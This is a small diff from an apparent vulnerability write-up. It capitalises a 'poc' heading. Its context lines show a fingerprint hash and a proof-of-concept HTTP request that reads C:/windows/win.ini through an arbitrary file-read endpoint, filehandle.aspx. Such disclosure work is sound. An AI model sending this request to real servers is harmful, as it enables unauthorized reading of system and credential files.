@@ -8,7 +8,7 @@
 icon_hash="-642591392"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini HTTP/1.1
